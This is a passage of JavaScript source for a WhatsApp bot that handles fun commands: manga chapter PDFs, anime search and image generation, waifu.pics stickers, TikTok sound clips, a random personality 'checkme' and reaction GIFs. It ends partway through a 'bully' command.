    if (chapterResponse.data.data.length === 0) {
      return replygcxlicon(`❌ No chapter ${chapterNumber} found for "${mangaTitle}".`);
    }

    const chapterId = chapterResponse.data.data[0].id;
    const serverResponse = await axios.get(`${baseUrl}/at-home/server/${chapterId}`);
    const { baseUrl: chapterBaseUrl, chapter } = serverResponse.data;

    const imageUrls = chapter.data.map(
      (fileName) => `${chapterBaseUrl}/data/${chapter.hash}/${fileName}`
    );

    if (imageUrls.length === 0) {
      return replygcxlicon(`❌ No images found for chapter ${chapterNumber} of "${mangaTitle}".`);
    }

    const pdfPath = `/tmp/manga_${mangaTitle}_chapter_${chapterNumber}.pdf`;
    const pdfDoc = new PDFDocument();
    const writeStream = fs.createWriteStream(pdfPath);

    pdfDoc.pipe(writeStream);

    for (const imgUrl of imageUrls) {
      const imageBuffer = (await axios.get(imgUrl, { responseType: 'arraybuffer' })).data;
      pdfDoc.addPage().image(imageBuffer, { fit: [500, 700], align: 'center', valign: 'center' });
    }

    pdfDoc.end();

    writeStream.on('finish', async () => {
      await XliconBotInc.sendMessage(m.chat, {
        document: { url: pdfPath },
        fileName: `Manga_${mangaTitle}_Chapter_${chapterNumber}.pdf`,
        mimetype: 'application/pdf',
      }, { quoted: m });

      fs.unlinkSync(pdfPath);
    });
  } catch (error) {
    console.error('Error fetching manga chapter:', error.message);
    return replygcxlicon('❌ An error occurred while fetching the chapter. Please try again later.');
  }
}
break;


case 'randommanga': {
  try {
    const offset = Math.floor(Math.random() * 1000);
    const randomUrl = `https://api.mangadex.org/manga?limit=1&offset=${offset}&availableTranslatedLanguage[]=en`;
    const response = await axios.get(randomUrl);

    if (!response.data || !response.data.data || response.data.data.length === 0) {
      return replygcxlicon('❌ Could not fetch a random manga. Please try again.');
    }

    const manga = response.data.data[0];
    const { title, description, status, tags } = manga.attributes;

    const genres = tags.map(tag => tag.attributes.name.en).join(", ") || "N/A";
    const mangaDetails = `
*📖 Random Manga Suggestion:*
⭐ *Title:* ${title.en || "N/A"}
📝 *Description:* ${description?.en || "No description available"}
📚 *Status:* ${status || "Unknown"}
🎭 *Genres:* ${genres}
    `;

    return replygcxlicon(mangaDetails);
  } catch (error) {
    console.error('Error fetching random manga:', error.message);
    return replygcxlicon(`❌ Error fetching random manga: ${error.message}`);
  }
}
break;

                
case 'mangaimg': {
  if (!text) return replygcxlicon(`*• Example:* ${prefix + command} a manga character 🖼️`);

  await XliconStickWait();

  try {
      // Fetch the manga image from the API
      let apiUrl = `${global.api}ai/manga-diffusion?apikey=${global.id}&prompt=${encodeURIComponent(text)}`;
      let response = await fetch(apiUrl);

      // Check if the response is okay
      if (!response.ok) {
          return replygcxlicon('❌ Failed to fetch the image. Please try again.');
      }

      // Convert the response to a buffer
      const buffer = await response.buffer();

      // Prepare the message to send
      const caption = `> Manga Image 🎨\n\n_*Here is the result of: ${text} 🌟*_`;

      // Send the image and caption
      await XliconBotInc.sendMessage(m.chat, {
          image: { buffer },
          caption: caption
      }, { quoted: m });

      await XliconBotInc.sendMessage(m.chat, { react: { text: "☑️", key: m.key } });

  } catch (e) {
      console.error(e);
      await XliconBotInc.sendMessage(m.chat, { react: { text: "✖️", key: m.key } });
      return replygcxlicon("❗ Error fetching the image. Please try again.");
  }
}
break;

case 'animeimg': {
  if (!text) return replygcxlicon(`*• Example:* ${prefix + command} a cute anime girl 👧✨`);

  await XliconStickWait();

  try {
      // Fetch the anime image from the API
      let apiUrl = `${global.api}ai/anime-gen?apikey=${global.id}&prompt=${encodeURIComponent(text)}`;
      let response = await fetch(apiUrl);

      // Check if the response is okay
      if (!response.ok) {
          return replygcxlicon('❌ Failed to fetch the image. Please try again.');
      }

      // Convert the response to a buffer
      const buffer = await response.buffer();

      // Prepare the caption for the image
      const caption = `> Anime Image 🎥\n\n_*Here is the result of: ${text} 🌟*_`;

      // Send the image and caption
      await XliconBotInc.sendMessage(m.chat, {
          image: { buffer },
          caption: caption
      }, { quoted: m });

      await XliconBotInc.sendMessage(m.chat, { react: { text: "☑️", key: m.key } });

  } catch (e) {
      console.error(e);
      await XliconBotInc.sendMessage(m.chat, { react: { text: "✖️", key: m.key } });
      return replygcxlicon("❗ Error fetching the image. Please try again.");
  }
}
break;
              
               
//--------------------------------------------------------------------------------------------//
//ANIME INFO AND WAIUS        
case 'searchanime': {
    if (!text) return replygcxlicon(`Which anime are you looking for?`);

    const malScraper = require('mal-scraper');
    await XliconStickWait();

    try {
        // Fetch anime info
        const anime = await malScraper.getInfoFromName(text).catch(() => null);
        if (!anime) return replygcxlicon(`Could not find any anime with the name "${text}"`);

        // Prepare anime info message
        let animetxt = `
🎀 *Title:* ${anime.title}
🎋 *Type:* ${anime.type}
🎐 *Premiered on:* ${anime.premiered}
💠 *Total Episodes:* ${anime.episodes}
📈 *Status:* ${anime.status}
💮 *Genres:* ${anime.genres}
🌟 *Score:* ${anime.score}
💎 *Rating:* ${anime.rating}
🏅 *Rank:* ${anime.ranked}
🌐 *URL:* ${anime.url}
❄ *Description:* ${anime.synopsis}`;

        // Send the message with anime image and info
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: anime.picture },
            caption: `Hi ${m.pushName}\n_*Here is the result of ${text}*_\n\n${animetxt}`
        }, { quoted: m });

    } catch (e) {
        console.error(e);
        return replygcxlicon("❗ Error fetching the anime. Please try again.");
    }
}
break;




case 'loli': {
    let baseUrl = 'https://weeb-api.vercel.app/';
    const response = await fetch(baseUrl + 'loli');  // Replace with 'loli' command
    const imageBuffer = await response.buffer();  // Get image buffer

    // Send the image with a simple message
    await XliconBotInc.sendMessage(m.chat, {
        image: imageBuffer,
        caption: `Hi ${m.pushName} 👋\n_*Here is the result of loli 🍭*_`
    }, { quoted: m });
}
break;

case 'waifu': {
    let baseUrl = 'https://weeb-api.vercel.app/';
    const response = await fetch(baseUrl + 'waifu');  // Replace with 'waifu' command
    const imageBuffer = await response.buffer();  // Get image buffer

    // Send the image with a simple message
    await XliconBotInc.sendMessage(m.chat, {
        image: imageBuffer,
        caption: `Hi ${m.pushName} 👋\n_*Here is the result of waifu 💖*_`
    }, { quoted: m });
}
break;

case 'neko': {
    let baseUrl = 'https://weeb-api.vercel.app/';
    const response = await fetch(baseUrl + 'neko');  // Replace with 'neko' command
    const imageBuffer = await response.buffer();  // Get image buffer

    // Send the image with a simple message
    await XliconBotInc.sendMessage(m.chat, {
        image: imageBuffer,
        caption: `Hi ${m.pushName} 👋\n_*Here is the result of neko 🐾🐱*_`
    }, { quoted: m });
}
break;

			case 'traceanime': {
    try {
        let q = m.quoted ? m.quoted : m;
        let mime = (q.msg || q).mimetype || q.mediaType || "";
        if (!mime.startsWith('image')) {
            return replygcxlicon("*Respond to an image*");
        }
        let data = await q.download();
        let image = await uploadImage(data);
        let apiUrl = `https://api.trace.moe/search?anilistInfo&url=${encodeURIComponent(image)}`;
        let response = await fetch(apiUrl);
        let result = await response.json();
        if (!result || result.error || result.result.length === 0) {
            return replygcxlicon("*Error: Could not track the anime.*");
        }
        let { anilist, from, to, similarity, video, episode } = result.result[0];
        let animeTitle = anilist.title ? anilist.title.romaji || anilist.title.native : "Unknown Title";
        let message = `*Anime:* ${animeTitle}\n`;
        if (anilist.synonyms && anilist.synonyms.length > 0) {
            message += `*Synonyms:* ${anilist.synonyms.join(", ")}\n`;
        }
        message += `*Similarity:* ${similarity.toFixed(2)}%\n`;
        message += `*Time:* ${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}\n`;
        if (episode) {
            message += `*Episode:* ${episode}\n`;
        }

        // Send the video with anime information as the caption
        await XliconBotInc.sendMessage(m.chat, {
            video: { url: video },
            caption: message
        }, { quoted: m });
    } catch (error) {
        console.error("Error:", error);
        replygcxlicon("*Error: Could not track the anime or send the video.*");
    }
}
break;


//Stickers of anime and manga
			case 'shinobu':{
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickhandhold': {
axios.get(`https://api.waifu.pics/sfw/handhold`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickshinobu': {
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickhighfive': {
axios.get(`https://api.waifu.pics/sfw/highfive`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickcuddle': {
axios.get(`https://api.waifu.pics/sfw/cuddle`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickcringe': {
axios.get(`https://api.waifu.pics/sfw/cringe`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickdance': {
axios.get(`https://api.waifu.pics/sfw/dance`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickhappy': {
axios.get(`https://api.waifu.pics/sfw/happy`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickglomp': {
axios.get(`https://api.waifu.pics/sfw/glomp`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'sticksmug': {
axios.get(`https://api.waifu.pics/sfw/smug`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickblush': {
axios.get(`https://api.waifu.pics/sfw/blush`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickawoo': {
axios.get(`https://api.waifu.pics/sfw/awoo`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickwave': {
axios.get(`https://api.waifu.pics/sfw/wave`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'sticksmile': {
axios.get(`https://api.waifu.pics/sfw/smile`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
        
case 'stickslap': {
axios.get(`https://api.waifu.pics/sfw/slap`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'sticknom': {
axios.get(`https://api.waifu.pics/sfw/nom`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickpoke': {
axios.get(`https://api.waifu.pics/sfw/poke`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickwink': {
axios.get(`https://api.waifu.pics/sfw/wink`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickbonk': {
axios.get(`https://api.waifu.pics/sfw/bonk`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickbully': {
axios.get(`https://api.waifu.pics/sfw/bully`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickyeet': {
axios.get(`https://api.waifu.pics/sfw/yeet`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickbite': {
axios.get(`https://api.waifu.pics/sfw/bite`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickkiss': {
axios.get(`https://api.waifu.pics/sfw/kiss`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'sticklick': {
axios.get(`https://api.waifu.pics/sfw/lick`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickpat': {
axios.get(`https://api.waifu.pics/sfw/pat`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickhug': {
axios.get(`https://api.waifu.pics/sfw/hug`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickkill': {
axios.get(`https://api.waifu.pics/sfw/kill`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickcry': {
axios.get(`https://api.waifu.pics/sfw/cry`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'stickspank':{
                axios.get(`https://nekos.life/api/v2/img/spank`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
        
case 'sticktickle':{
                axios.get(`https://nekos.life/api/v2/img/tickle`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break


case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await XliconBotInc.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
        
 //Anime Stickers end here       
        
case 'telestick': {
	if (m.isGroup) return XliconStickPrivate()
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let xliconresources = await Telesticker(args[0])
		await replygcxlicon(`Sending ${xliconresources.length} stickers...`)
		if (m.isGroup && xliconresources.length > 30) {
			await replygcxlicon('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < xliconresources.length; i++) {
				XliconBotInc.sendMessage(m.sender, { sticker: { url: xliconresources[i].url }})
			}
		} else {
			for (let i = 0; i < xliconresources.length; i++) {
				XliconBotInc.sendMessage(m.chat, { sticker: { url: xliconresources[i].url }})
			}
		}
	} else replygcxlicon(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
        
 


case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
XliconBotInc_dev = await getBuffer(`https://github.com/paskito002/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await XliconBotInc.sendMessage(m.chat, { audio: XliconBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
			
    
  case 'checkme': {
  const args = text.split(" ");
  const bet = `${sender}`;

  const sifat = ['🤔 Fine','😡 Unfriendly','👎 Chapri','💔 Nibba/nibbi','😤 Annoying','💀 Dilapidated','😡 Angry person','😊 Polite','🙄 Burden','💯 Great','🤮 Cringe','🤥 Liar'];
  const hoby = ['🍳 Cooking','💃 Dancing','🎮 Playing','🎮 Gaming','🎨 Painting','🤝 Helping Others','🍿 Watching anime','📚 Reading','🚴‍♂️ Riding Bike','🎤 Singing','💬 Chatting','😂 Sharing Memes','✍️ Drawing','💸 Eating Parents Money','🎲 Playing Truth or Dare','🤫 Staying Alone'];
  const bukcin = [...Array(100).keys()].map(i => String(i + 1));
  const arp = bukcin.slice();
  const cakep = ['✅ Yes','❌ No','😖 Very Ugly','😍 Very Handsome'];
  const wetak = ['💖 Caring','💎 Generous','😡 Angry person','😔 Sorry','🤲 Submissive','😊 Fine','🙇‍♂️ Im sorry','🧡 Kind Hearted','😌 Patient','🥰 UwU','🔥 Top','🤗 Helpful'];
  const baikk = bukcin.slice();
  const bhuruk = bukcin.slice();
  const cerdhas = bukcin.slice();
  const berhani = bukcin.slice();
  const mengheikan = bukcin.slice();

  const sipat = sifat[Math.floor(Math.random() * sifat.length)];
  const biho = hoby[Math.floor(Math.random() * hoby.length)];
  const bhucin = bukcin[Math.floor(Math.random() * bukcin.length)];
  const senga = arp[Math.floor(Math.random() * arp.length)];
  const chakep = cakep[Math.floor(Math.random() * cakep.length)];
  const watak = wetak[Math.floor(Math.random() * wetak.length)];
  const baik = baikk[Math.floor(Math.random() * baikk.length)];
  const burug = bhuruk[Math.floor(Math.random() * bhuruk.length)];
  const cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)];
  const berani = berhani[Math.floor(Math.random() * berhani.length)];
  const takut = mengheikan[Math.floor(Math.random() * mengheikan.length)];

  const profile = `
*≡═《𝗖𝗵𝗲𝗰𝗸 𝗽𝗿𝗼𝗳𝗶𝗹𝗲 𝗳𝗼𝗿 @${bet.split('@')[0]}》═≡*
*🤖 Bot Name: 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒-𝐕𝟏*

*🧑‍🤝‍🧑 𝗡𝗮𝗺𝗲:* ${m.pushName}
*⚡ 𝗖𝗵𝗮𝗿𝗮𝗰𝘁𝗲𝗿𝗶𝘀𝘁𝗶𝗰:* ${sipat}
*🎨 𝗛𝗼𝗯𝗯𝘆:* ${biho}
*💖 𝗦𝗶𝗺𝗽𝗹𝗲𝗻𝗲𝘀𝘀 (Simp):* ${bhucin}%
*💥 𝗚𝗿𝗲𝗮𝘁𝗻𝗲𝘀𝘀:* ${senga}%
*🌟 𝗛𝗮𝗻𝗱𝘀𝗼𝗺𝗲:* ${chakep}
*💬 𝗖𝗵𝗮𝗿𝗮𝗰𝘁𝗲𝗿:* ${watak}
*🌱 𝗚𝗼𝗼𝗱 𝗠𝗼𝗿𝗮𝗹𝘀:* ${baik}%
*😈 𝗕𝗮𝗱 𝗠𝗼𝗿𝗮𝗹𝘀:* ${burug}%
*🧠 𝗜𝗻𝘁𝗲𝗹𝗹𝗶𝗴𝗲𝗻𝗰𝗲:* ${cerdas}%
*🔥 𝗖𝗼𝘂𝗿𝗮𝗴𝗲:* ${berani}%
*😱 𝗔𝗳𝗿𝗮𝗶𝗱:* ${takut}%

*≡═《𝗖𝗵𝗲𝗰𝗸 𝗽𝗿𝗼𝗽𝗲𝗿𝘁𝗶𝗲𝘀》═≡*
`;

const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';
await XliconBotInc.sendMessage(m.chat, {
  image: { url: imageUrl }, // Directly use the URL for the image
  caption: profile, // Custom message with check result and mentioned user
  mentions: [bet] // Mentions the mentioned user
});
}
break;

      
        
			case 'hug': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/hug`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} hugged themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} hugged @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cry': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cried themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cried @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'kill': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kill`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} killed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} killed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'pat': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/pat`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} patted themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} patted @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'lick': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/lick`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} licked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} licked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'kiss': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kiss`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} kissed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} kissed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bite': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bit themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bit @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'yeet': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/yeet`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} yeeted themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} yeeted @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XliconBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bully': {

        if (!m.isGroup) return XliconStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxlicon(`Tag or reply to a person`)
